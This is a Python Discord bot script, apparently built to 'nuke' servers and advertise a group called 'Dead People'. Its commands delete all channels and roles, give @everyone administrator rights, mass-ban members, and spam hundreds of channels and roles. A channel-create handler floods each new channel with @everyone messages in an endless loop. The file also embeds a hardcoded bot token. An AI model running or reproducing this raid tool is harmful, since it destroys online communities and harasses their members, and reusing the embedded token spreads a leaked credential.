import os
import discord
from discord.ext import commands
import discord.ext.commands.bot
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import threading
import requests
import sys
import datetime
import json
import aiohttp
import time
from pypresence import Presence
from discord.ext.commands import Bot
import logging
from time import sleep
from os import system


#꒦︶₊꒷˚setting꒦︶₊꒷˚

prefix = "y"
intents = discord.Intents().all() 
TOKEN = 'MTA2MTkxNzgzODkxNjQ2MDU1NA.G3Jy0u.VZ0Uh0qGrMQD2L1fKJCf3agX5mbeAk4dM0ZDns' 
ownerid = ['1037259506717036575' , '1011802413130326046']
CHANNELS = ['Dead People']
VOICE = 'Dead People On The Top'
ROLE = 'ET'
NAME = '.gg/deadpeople'
white_list = ' '
MSG = ['@everyone Sau gần một năm lặn bởi thk svt sheluv bán sv POTP đã quay trở lại với tên gọi mới là Dead People và  dp  sẽ phát triển mạnh trong tương lai trong mọi người ủng hộ bọn tớ =))  @everyone https://discord.com/invite/deadpeople','@everyone DP ON THE TOP']
#꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚꒦︶₊꒷˚

client = commands.Bot(command_prefix=prefix, intents=intents)




@client.command(aliases=['nuked' , 'bom'])
async def raid(ctx):
  if str(ctx.author.id) in ownerid:
    guild = ctx.guild
    await ctx.message.delete()
    await ctx.guild.edit(name=NAME)
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "Everyone has administrator" +
              Fore.RESET)
    except:
        print(Fore.GREEN + "Everyone hasn't administrator" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} can't delete" + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} can't delete" + Fore.RESET)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"new invite: {link}")
    amount = 1
    for i in range(500):
        await guild.create_text_channel(random.choice(CHANNELS))
    print(f"nuked {guild.name} sucessfully.")
    return






@client.command(aliases=['deletec' 'xkenh'])
async def dc(ctx):
      if str(ctx.author.id) in ownerid:
            guild = client.get_guild(ctx.guild.id)
            for channel in guild.channels:
              try:
                await channel.delete()
                print(f"Deleted channel: {channel}")
              except:
                print(f"Can't delete channel: {channel}")
                pass
    
   

    

@client.command(aliases=['createc' , 'taok'])
async def spamch(ctx):
    if str(ctx.author.id) in ownerid:
        a = 1
        while a < 200:
            await ctx.guild.create_text_channel(random.choice(CHANNELS))
            print(f"{a} channels created")
            a += 1
    else:
        pass
#spamchat XD


@client.command()
async def spamrole(ctx):
    if str(ctx.author.id) in ownerid:
        a = 1
        while a < 100:
            await ctx.guild.create_role(name=ROLE)
            print(f"Tạo thành công {a}")
            a += 1
    else:
        pass

#massban
@client.command()
async def massban(ctx):
    for member in ctx.guild.members:
        if member == client.user or str(member.id) in ownerid:
            continue
        try:
            await member.ban(reason="ăn nuke =))")
        except discord.Forbidden:
            print(f"{member.name} ban thất bại khỏi {ctx.guild.name}")
        else:
            print(f"{member.name} đã bị ban khỏi {ctx.guild.name}")



@client.command()
async def spamv(ctx):

    if str(ctx.author.id) in ownerid:
        a = 1
        while a < 200:
            await ctx.guild.create_voice_channel(VOICE)
            print(f"Đã tạo {a} kênh voice")
            a += 1
    else:
        pass


      

@client.command()
async def perms(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "Mọi người đã có quyền admin" +
              Fore.RESET)
    except:
        print(Fore.GREEN + "Cấp quyền thất bại" + Fore.RESET)      



@client.event
async def on_ready():
    print(f"˳✦₊˚ name bot ˳✦₊˚: {client.user.name}")
    print(f"˳✦₊˚ bot id ˳✦₊˚: {client.user.id}")


@client.event 
async def on_guild_channel_create(channel):
    a = 1
    while a < 20:
        await channel.send(random.choice(MSG))

client.run(TOKEN)

